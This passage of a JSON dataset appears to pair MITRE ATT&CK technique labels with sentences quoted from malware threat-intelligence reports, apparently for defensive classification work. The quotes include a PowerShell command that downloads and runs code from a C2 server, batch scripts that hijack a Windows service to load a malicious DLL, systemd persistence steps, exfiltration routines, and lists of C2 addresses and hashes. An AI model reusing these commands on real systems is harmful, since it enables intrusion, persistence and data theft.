hxxp://60chicken[.]co[.]kr/wysiwyg/PEG_temp/logo1.pngReferenceshttp://blog.talosintelligence.com/2017/02/korean-maldoc.htmlhttp://blog.talosintelligence.com/2017/04/introducing-rokrat.htmlhttp://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html"
        ]
    },
    "screen capture audio capture-multi": {
        "technique_names": [
            "screen capture",
            "audio capture"
        ],
        "sentances": [
            "Apart for its backdoor routines, this malware can steal information through keylogging, audio recording, and screen capture",
            "Takes screenshots when recording VoiceIP app audio",
            "Screen capture and audio recording\u00a0 SpyNote RAT was able to take screen captures and, using the device\u2019s microphone, listen to audio conversations"
        ]
    },
    "process injection dll search order hijacking rundll32 dll side-loading-multi": {
        "technique_names": [
            "process injection",
            "dll search order hijacking",
            "rundll32",
            "dll side-loading"
        ],
        "sentances": [
            "Our analysis of the backdoors used in the September 2018 attacks show that AuditCred.dll/ROptimizer.dll was similarly used:    \u00a0 FileTokenBroker.dll\u00a0 (2017 attack) AuditCred.dll/Roptimizer.dll\u00a0 (2018 attack)   Launch Method Service Service   Function Loader Component Loader Component   Working directory %Windows%\\System32 %Windows%\\System32   Loaded Component Path %Windows%\\System32\\en-US %Program Files%\\Common Files\\System\\ado   Loaded Component Blending Blends with .mui files Blend with ActiveX data Object dll files    Table1: Similarities of the Loader components in both incidents Analysis of backdoors used in 2018 The Lazarus group used a series of backdoors in their 2018 attacks, employing a complicated technique that involves three major components:  AuditCred.dll/ROptimizer.dll (detected by Trend Micro as BKDR_BINLODR.ZNFJ-A) \u2013 loader DLL that is launched as a service Msadoz<n>.dll (detected by Trend Micro as BKDR64_BINLODR.ZNFJ-A) \u2013 encrypted backdoor n = number of characters in the loader dll\u2019s filename Auditcred.dll.mui/rOptimizer.dll.mui (detected by Trend Micro as TROJ_BINLODRCONF.ZNFJ-A) \u2013 encrypted configuration file   Figure 1: Loading sequence of the modularized backdoor The loader DLL is installed as a service and uses different names (AuditCred and ROptimizer) on different machines",
            "41 42 43 44 46 47 48 49 50 51 52 53 56 isys9core_64.dll isyspdf6_64.dll isyspdfl_64.dll isysdc_64.dll isys9.key isys.cwd isys.elx isys9_32.dll isys9core_32.dll isyspdf6_32.dll isyspdfl_32.dll isysdc_32.dll isys9_64.dll Proprietary \u201cISYS Search Software\u201d components are used by Indexer plugin",
            "These dropped files bundle functionality for both 64bit and 32bit Windows systems and are all located within one directory: C:\\Documents and Settings\\user\\Application Data\\ATI_Subsystem\\ 6761106f816313394a653db5172dc487,amdhcp32.dll,54kb \u00a0\u2190 32bit dll,CompiledOn:2014.07.02 21:13:24 d596827d48a3ff836545b3a999f2c3e3,aticaldd.dll,60kb \u00a0\u2190 64bit dll,CompiledOn:2014.07.02 21:13:26 bc626c8f11ed753f33ad1c0fe848d898,atiumdag.dll,285kb \u2190 32bit dll, Trojan.Win32.CozyDuke.a, CompiledOn:2014.07.02 21:13:26 4152e79e3dbde55dcf3fc2014700a022,6kb,racss.dat The code copies rundll32.exe from windows\\system32 to its newly created %appdata%\\ATI_Subsystem subdirectory as \u201camdocl_as32.exe\u201d alongside the three dll\u2019s listed above"
        ]
    },
    "security software discovery file deletion-multi": {
        "technique_names": [
            "security software discovery",
            "file deletion"
        ],
        "sentances": [
            "The backdoors they are deploying are difficult to detect and a significant threat to the privacy and security of enterprises, allowing attackers to steal information, delete files, install malware, and more"
        ]
    },
    "system service discovery new service remote services web service service execution-multi": {
        "technique_names": [
            "system service discovery",
            "new service",
            "remote services",
            "web service",
            "service execution"
        ],
        "sentances": [
            "Creates the service file /usr/lib/systemd/system/rsyncd.service [Unit]Description= synchronize and backup service.After=syslog.target [Service].ExecStart=/bin/rsyncd.OOMScoreAdjust=-500 [Install].WantedBy=multi-user.target Then it installs the service by executing the following commands: ln -s '/lib/systemd/system/rsyncd.service' '/etc/systemd/system/multi-user.target.wants /rsyncd.service' systemctl daemon-reload  The running systemd process determines, which option will be used to register the Trojan in autorun"
        ]
    },
    "data from local system deobfuscate/decode files or information software packing exfiltration over command and control channel data compressed data encrypted-multi": {
        "technique_names": [
            "data from local system",
            "deobfuscate/decode files or information",
            "software packing",
            "exfiltration over command and control channel",
            "data compressed",
            "data encrypted"
        ],
        "sentances": [
            "The configuration data used by the backdoor has the following structure: #pragma pack(push, 1) struct st_cncconfig {   _WORD id;   _BYTE byte2;   _BYTE byte3;   _QWORD pCnCBeg;   _QWORD pCnCEnd;   _QWORD pLastElement; }; #pragma pack(pop) To be able to enter the data into the database, Linux.BackDoor.Fysbis.1 converts the configuration data into the following structure: #pragma pack(push, 1) struct st_crypted_config_data {   _WORD id;   _BYTE byte2;   _BYTE byte3;   char* pCnC;  }; #pragma pack(pop) Before the configuration data is encrypted with the RC4 algorithm, 11 signature bytes are added to the end of the data (11 bytes are stored in the backdoor's body)"
        ]
    },
    "timestomp deobfuscate/decode files or information command-line interface-multi": {
        "technique_names": [
            "timestomp",
            "deobfuscate/decode files or information",
            "command-line interface"
        ],
        "sentances": [
            "The main module of the Trojan can execute the following commands:  CommandDescription 0x1FSet the dwell time value for the standby mode 0x29Activate the controllers 0x2ASet new configuration data and update the list of command and control servers 0x32Set the dwell time value for the active mode 0x33Set up the plug-in 0x33Save the dwell time values into the database 0x34Activate the plug-ins 0x35Add configuration data 0x36Delete the specified configuration data  The Remote Shell Module can execute the following commands:  CommandDescription 0x66Exit 0x65Open a remote Shell 0x68Verify that the Shell in running 0x67Execute a command  The module, which interacts with the file system, can execute the following commands:  cmdDescription 0x65Find the file(s) 0x66Read the file(s) 0x67Save the file 0x68Remove the file(s) 0x69Run the file(s)  A report on the operations\u2019 execution by this module is displayed as the HTML code"
        ]
    },
    "process injection dll side-loading-multi": {
        "technique_names": [
            "process injection",
            "dll side-loading"
        ],
        "sentances": [
            "Different colors show the three dropped modules: legit app (blue), launcher (green), and decompressor with the Trojan embedded (red) The initial module drops three files that are typical for Chinese-speaking actors: a legit Symantec pcAnywhere (IntgStat.exe) for DLL side loading, a .dll launcher (pcalocalresloader.dll) and the last-stage decompressor (thumb.db)",
            "The malicious DLL is also responsible for terminating the cliconfg.exe process and deleting the malicious NTWDBLIB.dll using: cmd /c taskkill /im cliconfg.exe /f /t && del /f /q NTWDBLIB.DLL All the following capabilities described are implemented by the malicious service DLL implant unless specified.\u00a0\u00a0 Variant using North Korean Red Cross Another variant (hash: 9e2c0bd19a77d712055ccc0276fdc062e9351436) of the malicious Word dropper uses the same Base64-decoding scheme with a different custom key",
            "25 26 ix32.dll ix64.dll LoadLibrary call template dll is used by Reinstaller/Injector plugin (rsXX.dll) for injecting LoadLibrary call into running processes",
            "37 38 zlib64.dll zlib32.dll Open source \u201czlib\u201d version 1.2.3 used by libpngXX.dll for compressing screenshots (ssXX.dll)"
        ]
    },
    "masquerading web service-multi": {
        "technique_names": [
            "masquerading",
            "web service"
        ],
        "sentances": [
            "The weaponized Office documents were found to be hosted either on what appeared to be compromised legitimate websites, or on websites using domain names similar to legitimate domain names in appearance"
        ]
    },
    "command-line interface powershell-multi": {
        "technique_names": [
            "command-line interface",
            "powershell"
        ],
        "sentances": [
            "The loader\u2019s main goal was to run a PowerShell command to execute shellcode",
            "The \u201cExcel\u201d command receives another stage of the PowerShell code, saves it in \u201cc:\\programdata\\a.ps1\u201d and then asks Excel to execute this PowerShell script via DDE"
        ]
    },
    "standard application layer protocol scripting powershell-multi": {
        "technique_names": [
            "standard application layer protocol",
            "scripting",
            "powershell"
        ],
        "sentances": [
            "The shellcode executed by this PowerShell is the exact same as in the delivery documents, using code from Metasploit which can obtain additional shellcode to execute using an HTTP request to the following URL: http://www7.chrome-up[.]date/0m5EE We were not able to retrieve the shellcode hosted at this URL"
        ]
    },
    "standard application layer protocol custom cryptographic protocol web service exfiltration over command and control channel credentials in files uncommonly used port fallback channels system time discovery-multi": {
        "technique_names": [
            "standard application layer protocol",
            "custom cryptographic protocol",
            "web service",
            "exfiltration over command and control channel",
            "credentials in files",
            "uncommonly used port",
            "fallback channels",
            "system time discovery",
            "commonly used port"
        ],
        "sentances": [
            "Palo Alto Networks customers are protected via the following:  WildFire identification and detection of malicious samples Command and control servers are classified as malicious AutoFocus tags have been created  Magic Hound MagicHound DropIt MagicHound Fetch MagicHound Retriever MagicHound Rollover MagicHound Leash MagicHound MPKBot PuPYRAT    INDICATORS OF COMPROMISE MagicHound.DropIt SHA256 c21074f340665935e6afe2a972c8d1ab517954e2dd05cc73e5ff0e8df587b99d ea139a73f8ec75ea60dfa87027c7c3ef4ed61b45e1acb5d1650cc54e658984ba da2abdc951e4b2272fea5c8989debd22e26350bab4b4219104bccec5b8a7ff5a 0d3ae682868cb3ff069ec52e1ffc5ef765453fd78e47b6366d96aebb09afd8ab f0ecc4388f0d84501499711681a64a74c5d95e0bb6a2174cbe3744bd5a456396 860f4cd44371a180a99bc16526f54f8b051c420a3df334d05d569d0cdadac3d2 b42b1186211633c2d47f3d815f0371ba234fee2ed0f26e487badc58e1ab81061 4beee6e7aa244335e161fdc05296ea100090c2114b4ff2e782e3ee3e1f936fdf 5e0e09c9860b293c4c9a2382a7392963adc54d6a23440abb9a2d89c50f8fd305 3161f9087d89a2d036ea32741d5a006c6bb279d36ff8d1acde63f2e354f8c502 \u00a0 MagicHound.Fetch PE SHA256 b6c159cad5a867895fd41c103455cebd361fc32d047b573321280b1451bf151c 6a7537f2cedbf453114cfba086e4746e698713777fb4fa4fc8964247dde741ed 16d87fbd8667677da1af5433b6d797438f8dc0ab565fb40ecb29f83f148888cd 92bc7d04445cf67aa7ddf15792cd62778d2d774d06616d1986f4c389b3d463f5 86d3409c908f667dd298b6a7e1e17652bb29af73e7daed4a5e945fbdf742e9f4 c3a8f5176351e87d28f45e58c79bb6646bb5d94ade7a24c6556514c860004143 a390365ddfcce146a8fa8435022f19b9a1be29f2b11a049cb660ec53f36beb06 d2ffc757a12817e4b58b3d58d71da951b177dedd3f65ca41fad04a03fc63fac6 79c9894b50cde62b182bd1560060c5c2bf5a1cef2b8afdffc4766e8c55ff6932 2f7f3582504fbce349a6991fbb3b5f9577c5c014b6ce889b80d51977fa6fb31a 8c2e4aa8d73ad2e48d70dfa18abea62769c7bef59c8c1607720f4f6162413f75 abe8e86b787998a07411ee24f3f3d8a79e37c6da539650ceed566b081f968c26 9e4d2e983f8a807f741f8873e6fa5d222dc6f3b358ccfc3a6c700398b342f656 e57f77cc3d117923ec01aa0e044edc11b1042e57993ca7f74d971630893ca263 ca6e823dedd6ca5fada2b1fa63d0acb288027f5a3cdd2c60dcace3c424c5ced0 eaaecabb439c81e522d9f5681fdb047ee62381e763f0d9646e68cd507479ba5a 1c3e527e496c4b0594a403d6d582bc6db3029d27369720d0d5122f862b10d8f1 29a659fb0ef0262e4de0dc3c6a140677b6ddee13c1819b791bd280be0547e309 \u00a0 MagicHound.Fetch PE C2 service.chrome-up[.]date www3.chrome-up[.]date www7.chrome-up[.]date timezone[.]live service1.chrome-up[.]date 104.238.184[.]252 www5.chrome-up[.]date servicesystem.serveirc[.]com \u00a0 MagicHound.Fetch DOC SHA256 218fac3d0639c0d762fcf71685bcf6b64c33d1533df03b4cf223d9b07ca1e3c2 e5b643cb6ec30d0d0b458e3f2800609f260a5f15c4ac66faf4ebf384f7976df6 71e584e7e1fb3cf2689f549192fe3a82fd4cd8ee7c42c15d736ebad47b028087 388b26e22f75a723ce69ad820b61dd8b75e260d3c61d74ff21d2073c56ea565d 33ee8a57e142e752a9c8960c4f38b5d3ff82bf17ec060e4114f5b15d22aa902e 5469facc266d5582bd387d69032a91c8fff373213b66a2f0852666e72bcdc1da 528714aaaa4a083e72599c32c18aa146db503eee80da236b20aea11aa43bdf62 66d24a529308d8ab7b27ddd43a6c2db84107b831257efb664044ec4437f9487b cfce4827106c79a81eef6d3a0618c90bf5f15936036873573db76bed7e8a0864 68db2b363a88b061cc9063535f3920673f1f08d985b14cb52b898ced6c0f8964 e837f6b814c09900726dac2cf55f41babf361152875ba2a765a34ee5cc496087 f912d40de9fe9a726448c1d84dfba2d4941f57210b2dbc035f5d34d68e8ac143 af0ae0fa877f921d198239b7c722e12d14b2aa32fdfadaa37b47f558ae366de9 6d1a50ca3e80442fa3e2caca86c166ed60bef32c2d0af7352cd227303cdec031 \u00a0 MagicHound.Fetch DOC C2 45.76.128[.]165 139.59.46[.]154 104.218.120[.]128 89.107.62[.]39 69.87.223[.]26 analytics-google[.]org 89.107.60[.]11 www3.chrome-up[.]date www.microsoftsubsystem.com-adm[.]in www1.chrome-up[.]date \u00a0 MagicHound.Fetch XLS SHA256 6c195ea18c05bbf091f09873ed9cd533ec7c8de7a831b85690e48290b579634b 97943739ccf8a00036dd3cdd0ba48e17a82ab9b65cc22c17c6e6258e72bb9ade \u00a0 MagicHound.Fetch XLS C2 45.76.128[.]165 139.59.46[.]154 \u00a0 Pupy Loaders SHA256 7e57e35f8fce0efc3b944a7545736fa419e9888514fcd9e098c883b8d85e7e73 db453b8de1a01a3e4d963847c0a0a45fb7e1a9b9e6d291c8883c74019f2fc91f 82779504d3fa0ffc8506ab69de9cb4d8f6415adbb11a9b8312828c539cf10190 \u00a0 Pupy Loaders C2 139.59.46[.]154 www1.chrome-up[.]date \u00a0 MagicHound.Retriever SHA256 1c550dc73b7a39b0cd21d3de7e6c26ece156253ac96f032efc0e7fcc6bc872ce 7cdbf5c035a64cb6c7ee8c204ad42b4a507b1fde5e6708ea2486942d0d358823 b2ea3fcd2bc493a5ac86e47029b076716ed22ef4487f9090f4aa1923a48015d6 3f23972a0e80983351bedf6ad45ac8cd63669d3f1c76f8834c129a9e0418fff1 \u00a0 MagicHound.Retriever C2 service.chrome-up[.]date msservice[.]site microsoftexplorerservices[.]cloud \u00a0 MagicHound.Leash SHA256 133959be8313a372f7a8d95762722a6ca02bc30aaffde0cbcf6ba402426d02f5 ba3560d3c789984ca29d80f0a2ea38a224e776087e0f28104569630f870adaf4 d8731a94d17e0740184910ec81ba703bad5ff7afc92ba056f200533f668e07bf \u00a0 MagicHound.Leash C2 45.56.123[.]129 syn.timezone[.]live \u00a0 MPKBot SHA256 d08d737fa59edbea4568100cf83cff7bf930087aaa640f1b4edf48eea4e07b19 \u00a0 MPKBot C2 45.58.37[.]142 Appendix MAGICHOUND.ROLLOVER The Magic Hound campaign used Word and Excel documents as a delivery method, specifically documents that contain a malicious macro that attempts to load either the Pupy RAT or possibly Meterpreter"
        ]
    },
    "standard application layer protocol fallback channels powershell-multi": {
        "technique_names": [
            "standard application layer protocol",
            "fallback channels",
            "powershell"
        ],
        "sentances": [
            "The macro carries out this first technique by running the following command:powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('hxxp://139.59.46.154:3485/eiloShaegae1')\"The code above generates the following HTTP request, which the C2 server would then respond to with a script that PowerShell would execute: GET /eiloShaegae1 HTTP/1.1 Host: 139.59.46[.]154:3485 Connection: Keep-Alive The second method involves using PowerShell to create a thread to execute a buffer of shellcode, which we believe the threat actors obtained from the Magic Unicorn source code"
        ]
    },
    "deobfuscate/decode files or information remote file copy-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "remote file copy"
        ],
        "sentances": [
            "After we decrypted the additional shellcode, we determined that the functional shellcode is part of the Metasploit Framework, specifically using the block_api.asm code to resolve API function names and the block_reverse_http.asm code to obtain additional shellcode to execute on the system"
        ]
    },
    "registry run keys / startup folder hidden files and directories-multi": {
        "technique_names": [
            "registry run keys / startup folder",
            "hidden files and directories",
            "tor"
        ],
        "sentances": [
            "To set up persistence, the loader creates a folder named \u201cc:\\temp\u201d, sets its attributes to be a hidden and system folder to hide the folder from view in Windows Explorer"
        ]
    },
    "system network configuration discovery web service fallback channels-multi": {
        "technique_names": [
            "system network configuration discovery",
            "web service",
            "fallback channels"
        ],
        "sentances": [
            "We have gathered three samples of the default loader associated with this group and extracted the following configurations:    SHA256 of Sample Configuration   82779504d3fa0ffc8506ab69de9cb4d8f6415adbb11a9b8312828c539cf10190 LAUNCHER_ARGS=[\u2018\u2013host\u2019, \u2018www1.chrome-up[.]date:4443\u2019, \u2018-t\u2019, \u2018obfs3\u2019]   db453b8de1a01a3e4d963847c0a0a45fb7e1a9b9e6d291c8883c74019f2fc91f LAUNCHER_ARGS=[\u2018\u2013host\u2019, \u2018www1.chrome-up[.]date:4443\u2019, \u2018-t\u2019, \u2018obfs3\u2019]   7e57e35f8fce0efc3b944a7545736fa419e9888514fcd9e098c883b8d85e7e73 LAUNCHER_ARGS=[\u2018\u2013host\u2019, \u2018139.59.46[.]154:3543\u2019, \u2018-t\u2019, \u2018obfs3\u2019]    \u00a0 These configurations show that this group uses both fully-qualified domain names and IP addresses to host their Pupy C2 servers"
        ]
    },
    "execution through api application window discovery-multi": {
        "technique_names": [
            "execution through api",
            "application window discovery"
        ],
        "sentances": [
            "The following commands are available:    Command  SubCommand Description   VER  Generates the following IRC client command that will be sent to the C2 server: \u00a0 PRIVMSG <username> :\u00a0\u00a0\u00a0 8 LED= 20160124   KILL  Trojan disconnects from the IRC server and terminates itself   RESET  Trojan disconnects from the IRC server and runs the executable again   OS  Obtains the Windows version and responds to the C2 with the following message \u201cPRIVMSG <username> :<one of the following version strings>\u201d: \u00a0 Windows NT Windows 95 Windows 98 Windows ME Windows 2003 Windows XP Windows 7 Windows Vista Unkown os info   !SH EXEC Not supported    MD Creates a specified directory",
            "Embed \"scriptlets\" in generated payloads to perform some tasks \"offline\" without needing network connectivity (ex: start keylogger, add persistence, execute custom python script, check_vm, etc.)   Multiple Target Platforms:      Platform Support Status     Windows XP Supported   Windows 7 Supported   Windows 8 Supported   Windows 10 Supported   Linux Supported   Mac OSX Limited Support   Android Limited Support    Documentation All documentation can be found on the wiki"
        ]
    },
    "system owner/user discovery system owner/user discovery system owner/user discovery system owner/user discovery-multi": {
        "technique_names": [
            "system owner/user discovery"
        ],
        "sentances": [
            "The Trojan will respond to the C2 with \u201cPRIVMSG <username> : <message> [<specified path>]\u201d"
        ]
    },
    "system owner/user discovery system information discovery-multi": {
        "technique_names": [
            "system owner/user discovery",
            "system information discovery"
        ],
        "sentances": [
            "SA  Generates the following IRC client command that will be sent to the C2 server: PRIVMSG <username> : Hello ,my name is\u00a0 <IRC USER name>, Im ready my Computer Name is:<computer name>  \u00a0 All of the commands, except for the VER command, must be issued by individuals in the IRC channel with nicknames that start with \u201cAS_\u201d or \u201cAF_\u201d",
            "!Hello The Trojan introduces itself by sending the current username, if its an admin account or not, the computer name, the system UUID and the OS version"
        ]
    },
    "process discovery remote file copy-multi": {
        "technique_names": [
            "process discovery",
            "remote file copy"
        ],
        "sentances": [
            "!ProcessList List running processes, including their PID, parent PID, executable name and priority   !SendFileToServer Uploads a specified file to the C2 server   !CaptureScreen Takes a screenshot that it saves to a file and uploads to the C2 server"
        ]
    },
    "process injection bypass user account control-multi": {
        "technique_names": [
            "process injection",
            "bypass user account control"
        ],
        "sentances": [
            "UAC bypass via DLL hijacking requires:  A Windows executable with the auto-elevate property in its manifest A Windows executable in a secure directory (%systemroot%\\system32)  The malicious NTWDBLIB DLL performs the simple task of setting up the malicious ipnet.dll as a service by running one of the two batch files contained in the CAB file (which is also dropped to %systemroot%\\system32):  NTWDBLIB executing the installer batch files under the context of cliconfg.exe.\u00a0 The batch files involved in the attack modify the system service COMSysApp to load the malicious ipnet.dll"
        ]
    },
    "process injection modify registry scripting service execution-multi": {
        "technique_names": [
            "process injection",
            "modify registry",
            "scripting",
            "service execution"
        ],
        "sentances": [
            "The contents of the batch files vary depending on the OS (x64 vs x86): install1.bat (x64) @echo off sc stop COMSysApp sc config COMSysApp type= own start= auto error= normal binpath= \"%windir%\\SysWOW64\\svchost.exe -k COMSysApp\" reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysApp\" /f reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir%\\SysWOW64\\ipnet.dll\" /f sc start COMSysApp del /f /q %windir%\\SysWOW64\\install2.bat del /f /q %windir%\\SysWOW64\\install1.bat install2.bat (x86) @echo off sc stop COMSysApp sc config COMSysApp type= own start= auto error= normal binpath= \"%windir%\\System32\\svchost.exe -k COMSysApp\" reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysApp\" /f reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir%\\system32\\ipnet.dll\" /f sc start COMSysApp del /f /q %windir%\\System32\\install1.bat del /f /q %windir%\\System32\\install2.bat The batch files perform these tasks:  Stop the service COMSysApp Configure the service to autostart (to set up persistence on the system) Modify registry keys to launch the DLL unser svchost.exe Specify the malicious DLL path to be loaded into the svchost process"
        ]
    },
    "system information discovery data staged process discovery data encrypted-multi": {
        "technique_names": [
            "system information discovery",
            "data staged",
            "process discovery",
            "data encrypted"
        ],
        "sentances": [
            "System info:  Computer name System info using: cmd /c systeminfo >%temp%\\temp.ini List of currently running process using: cmd /c tasklist >%temp%\\temp.ini    Exfiltration  The data exfiltration process runs in the following sequence: The temp.ini files are copied into a text file that matches the pattern:  From <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt"
        ]
    },
    "command-line interface data compressed data encoding-multi": {
        "technique_names": [
            "command-line interface",
            "data compressed",
            "data encoding"
        ],
        "sentances": [
            "For example, From <COMPUTER-NAME> (01-04 11-40-02).txt  All the text files are now packed into the archive temp.zip (%temp%\\temp.zip) zip is Base64 encoded (with a custom key, same as that used in the malicious document) and then copied to post.txt txt is uploaded to the control server  Additional Commands and Capabilities The service-based DLL implant traverses to the /htdocs/ directory on the FTP server and looks for any files with the keywords:  TO EVERYONE: Commands issued to all infected endpoints TO <COMPUTERNAME>: Commands issued to endpoints matching the ComputerName  The following commands are supported by the malware implant:  cmd /c pull <filename>: Adds filename to temp.zip, Base64 encodes, and uploads to control server cmd /c chip <string>: Deletes current ipnet.ini config file"
        ]
    },
    "deobfuscate/decode files or information binary padding-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "binary padding"
        ],
        "sentances": [
            "Based on the McAfee Advanced Threat Research team\u2019s analysis, we find multiple components from this operation are unique from a code perspective, even though the code is loosely based on previous versions of the SYSCON backdoor",
            "The string \u201cfjzmpcjvqp\u201d is unique and not something likely to be present if the code was not generated with the same public POC exploit code"
        ]
    },
    "exfiltration over alternative protocol": [
        "Indicators of compromise MITRE ATT&CK techniques  Modify existing service Code signing File deletion Deobfuscate/decode files or information System information discovery Process discovery Service execution RunDLL32 Scripting Command-line Interface Data from local system Automated exfiltration Data encrypted Commonly used port Bypass user account control  Hashes  fe32d29fa16b1b71cd27b23a78ee9f6b7791bff3 f684e15dd2e84bac49ea9b89f9b2646dc32a2477 1d280a77595a2d2bbd36b9b5d958f99be20f8e06 19d9573f0b2c2100accd562cc82d57adb12a57ec f90a2155ac492c3c2d5e1d83e384e1a734e59cc0 9b832dda912cce6b23da8abf3881fcf4d2b7ce09 f3b62fea38cb44e15984d941445d24e6b309bc7b 66d2cea01b46c3353f4339a986a97b24ed89ee18 7113aaab61cacb6086c5531a453adf82ca7e7d03 d41daba0ebfa55d0c769ccfc03dbf6a5221e006a 25f4819e7948086d46df8de2eeeaa2b9ec6eca8c 35ab747c15c20da29a14e8b46c07c0448cef4999 e87de3747d7c12c1eea9e73d3c2fb085b5ae8b42 0e4a7c0242b98723dc2b8cce1fbf1a43dd025cf0 bca861a46d60831a3101c50f80a6d626fa99bf16 01530adb3f947fabebae5d9c04fb69f9000c3cef 4229896d61a5ad57ed5c247228606ce62c7032d0 4c7e975f95ebc47423923b855a7530af52977f57 5a6ad7a1c566204a92dd269312d1156d51e61dc4 1dc50bfcab2bc80587ac900c03e23afcbe243f64 003e21b02be3248ff72cc2bfcd05bb161b6a2356 9b7c3c48bcef6330e3086de592b3223eb198744a 85e2453b37602429596c9681a8c58a5c6faf8d0c  Domains  ftp.byethost31.com ftp.byethost11.com 1113427185.ifastnet.org navermail.byethost3.com nihon.byethost3.com",
        "Figure 15: Structure used to send data to server    Figure 16: Structure used to send data to C2 server The structure is converted to Base64 using the CryptBinaryToStringA function",
        "It then uses WebDAV to upload to a Box cloud drive."
    ],
    "windows management instrumentation modify registry query registry-multi": {
        "technique_names": [
            "windows management instrumentation",
            "modify registry",
            "query registry"
        ],
        "sentances": [
            "WMI Namespaces    Win32_OperatingSystem    Win32_ComputerSystem    AntiSpywareProduct    AntiVirusProduct    FirewallProduct    Win32_UserAccount    Win32_NetworkAdapter    Win32_Process    Table 1: Referred classes WMI Queries and Registry Keys Used  SELECT Caption FROM Win32_TimeZone SELECT CSNAME, Caption, CSDVersion, Locale, RegisteredUser FROM Win32_OperatingSystem SELECT Manufacturer, Model, SystemType, DomainRole, Domain, UserName FROM Win32_ComputerSystem  Registry entries are read for potential administration escalation and proxy information"
        ]
    },
    "query registry": [
        "Registry key \u201cSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System \u201d is queried to check the values ConsentPromptBehaviorAdmin and PromptOnSecureDesktop",
        "Much like the previous version of Reaver, Reaver.v3 will query the necessary registry keys to determine the correct startup path to use"
    ],
    "connection proxy query registry-multi": {
        "technique_names": [
            "connection proxy",
            "query registry"
        ],
        "sentances": [
            "Registry key \u201cSoftware\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\\u201d is queried to gather proxy information with values ProxyEnable, Proxy: (NO), Proxy, ProxyServer"
        ]
    },
    "file deletion shortcut modification-multi": {
        "technique_names": [
            "file deletion",
            "shortcut modification"
        ],
        "sentances": [
            "Once all the tasks have been executed completely, the malware breaks the loop, sends the termination buffer back, and clears all the footprints from the targeted machine:  Deletes the LNK file from the startup directory"
        ]
    },
    "file deletion modify registry-multi": {
        "technique_names": [
            "file deletion",
            "modify registry"
        ],
        "sentances": [
            "Deletes the registry key HKCU\\Software\\Classes\\Applications\\rundll32.exe\\shell\\open Deletes the dropper components from the system",
            "However, if you DO get infected, you\u2019ll want to delete the following registry keys (if they exist): HKLM/System/CurrentControlSet/Services/DirecastX ytasda jrqq HKLM/System/CurrentControlSet/Services/DirectX yta jsdrq HKLM/System/CurrentControlSet/Services/DirectX ytsda jrq Additionally, you\u2019ll want to delete any copies of \u201csvchost.exe\u201d that you find in %Program Files (x86)%/DIFXE/, as these are the dropped copies of the malware"
        ]
    },
    "system service discovery account discovery remote system discovery windows admin shares-multi": {
        "technique_names": [
            "system service discovery",
            "account discovery",
            "remote system discovery",
            "windows admin shares"
        ],
        "sentances": [
            "Appendix Indicators of Compromise    11227ECA89CC053FB189FAC3EBF27497  Seminar.rtf    4DE5ADB865B5198B4F2593AD436FCEFF  Seminar.rtf    78734CD268E5C9AB4184E1BBE21A6EB9  Zam<RandomNumber>.doc    92F63B1227A6B37335495F9BCB939EA2  FELIXROOT Dropper    DE10A32129650849CEAF4009E660F72F  FELIXROOT Backdoor    Table 4: FELIXROOT IOCs  Network Indicators of Compromise 217.12.204.100/news 217.12.204.100:443/news 193.23.181.151/Seminar.rtf Accept-Encoding: gzip, deflate content-Type: application/x-www-form-urlencoded Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2) Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2) Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2) Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2) Configuration Files  Version 1: {\"1\" : \"https://88.198.13.116:8443/xmlservice\",\"2\" : \"30\",\"4\" : \"GufseGHbc\",\"6\" : \"3\", \"7\" : \u201chttp://88.198.13.116:8080/xmlservice\"}  Version 2: {\"1\" : \"https://217.12.204.100/news/\",\"2\" : \"30\",\"4\" : \"KdfrJKN\",\"6\" : \"3\", \"7\" : \"http://217.12.204.100/news/\"} FireEye Detections    MD5  Product  Signature  Action    11227ECA89CC053FB189FAC3EBF27497  NX/EX/AX  Malware.Binary.rtf  Block    4DE5ADB865B5198B4F2593AD436FCEFF  NX/EX/AX  Malware.Binary.rtf  Block    78734CD268E5C9AB4184E1BBE21A6EB9  NX/EX/AX  Malware.Binary  Block    92F63B1227A6B37335495F9BCB939EA2  NX/EX/AX  FE_Dropper_Win32_FELIXROOT_1  Block    DE10A32129650849CEAF4009E660F72F  NX/EX/AX  FE_Backdoor_Win32_FELIXROOT_2  Block    11227ECA89CC053FB189FAC3EBF27497  HX  IOC  Alert    4DE5ADB865B5198B4F2593AD436FCEFF  HX  IOC  Alert    Table 5: FireEye Detections Acknowledgements Special thanks to Jonell Baltazar, Alex Berry and Benjamin Read for their contributions to this blog."
        ]
    },
    "masquerading obfuscated files or information-multi": {
        "technique_names": [
            "masquerading",
            "obfuscated files or information"
        ],
        "sentances": [
